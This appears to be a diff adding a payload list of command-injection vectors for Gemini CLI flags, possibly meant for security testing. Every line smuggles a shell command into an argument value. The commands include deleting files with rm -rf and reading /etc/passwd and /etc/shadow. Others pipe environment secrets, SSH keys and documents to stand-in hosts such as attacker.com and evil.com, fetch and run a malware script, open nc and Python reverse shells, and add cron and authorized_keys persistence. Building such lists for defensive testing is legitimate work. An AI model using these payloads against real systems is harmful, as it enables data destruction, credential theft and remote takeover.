@@ -1,0 +1,64 @@
+# Command injection vectors targeting Gemini CLI argument parsing
+--model="gemini-pro';rm -rf /;echo 'injected'"
+--temperature="0.7';cat /etc/passwd;echo 'pwned'"
+--max-tokens="1000';curl http://attacker.com/exfil?data=$(whoami);echo 'done'"
+--output="/tmp/test';nc -e /bin/sh attacker.com 4444;echo 'backdoor'"
+--config="config.json';wget http://evil.com/malware.sh -O /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh;echo 'executed'"
+
+# Shell metacharacter injection
+--prompt="test`whoami`test"
+--prompt="test$(id)test"
+--prompt="test;ls -la;echo test"
+--prompt="test|nc attacker.com 1337|echo test"
+--prompt="test&sleep 10&echo test"
+
+# Environment variable extraction
+--model="gemini-pro';env | grep -E '(API_KEY|TOKEN|SECRET|PASSWORD)' | curl -X POST -d @- http://attacker.com/steal;echo 'leaked'"
+--api-key="fake';printenv | base64 | curl -X POST -d @- http://evil.com/env;echo 'sent'"
+
+# File system manipulation
+--output="../../../etc/passwd';cp /etc/shadow /tmp/stolen;echo 'copied'"
+--config="/dev/null';find / -name '*.key' -o -name '*.pem' 2>/dev/null | head -10 > /tmp/keys.txt;echo 'found'"
+--log-file="/var/log/auth.log';tail -100 /var/log/auth.log | curl -X POST -d @- http://attacker.com/logs;echo 'sent'"
+
+# Process manipulation and persistence
+--timeout="30';crontab -l | { cat; echo \"* * * * * curl http://evil.com/beacon\"; } | crontab -;echo 'persisted'"
+--retry="3';echo \"ssh-rsa AAAAB3... attacker@evil.com\" >> ~/.ssh/authorized_keys;echo 'backdoored'"
+
+# Network-based attacks
+--host="localhost';nc -l -p 31337 -e /bin/bash &;echo 'listening'"
+--port="8080';python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('attacker.com',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])\";echo 'connected'"
+
+# Data exfiltration vectors
+--user-agent="Mozilla/5.0';find /home -name '*.txt' -o -name '*.doc' -o -name '*.pdf' | head -20 | tar czf - | base64 | curl -X POST -d @- http://attacker.com/files;echo 'uploaded'"
+--headers="X-Test: value';grep -r \"password\\|secret\\|key\" /etc/ 2>/dev/null | head -10 | curl -X POST -d @- http://evil.com/secrets;echo 'leaked'"
+
+# Privilege escalation attempts
+--bind="0.0.0.0:3000';sudo -l | curl -X POST -d @- http://attacker.com/sudo;echo 'checked'"
+--listen="8080';find / -perm -4000 2>/dev/null | curl -X POST -d @- http://evil.com/suid;echo 'found'"
+
+# Memory and process inspection
+--debug="true';ps aux | grep -v grep | curl -X POST -d @- http://attacker.com/processes;echo 'sent'"
+--verbose="true';cat /proc/meminfo /proc/cpuinfo | curl -X POST -d @- http://evil.com/sysinfo;echo 'leaked'"
+
+# Container escape attempts
+--format="json';mount | grep docker | curl -X POST -d @- http://attacker.com/mounts;echo 'checked'"
+--mode="development';ls -la /proc/1/root/ 2>/dev/null | curl -X POST -d @- http://evil.com/root;echo 'probed'"
+
+# Null byte injection and encoding bypass
+--prompt="test\x00';rm -rf /tmp/*;echo 'cleaned'"
+--token="valid\0';echo \"malicious payload\" > /tmp/injected;echo 'written'"
+--config="config.json\x00';cat /etc/hosts | base64 | curl -X POST -d @- http://attacker.com/hosts;echo 'sent'"
+
+# Unicode and encoding attacks
+--prompt="test\u0000';curl http://evil.com/unicode;echo 'triggered'"
+--model="gemini\u002dpro';echo \"unicode injection\" | base64;echo 'encoded'"
+
+# Time-based attacks for blind injection detection
+--delay="1000';sleep 30;echo 'delayed'"
+--timeout="10';ping -c 10 attacker.com;echo 'pinged'"
+
+# Whitelisting bypass vectors (CVE-2024-specific)
+--model="grep';rm -rf /tmp/test;echo 'bypassed'"
+--config="cat';env | grep SECRET | curl -X POST -d @- http://evil.com/bypass;echo 'leaked'"
+--output="ls';find /home -name id_rsa | head -5 | tar czf - | base64 | curl -X POST -d @- http://attacker.com/keys;echo 'stolen'"
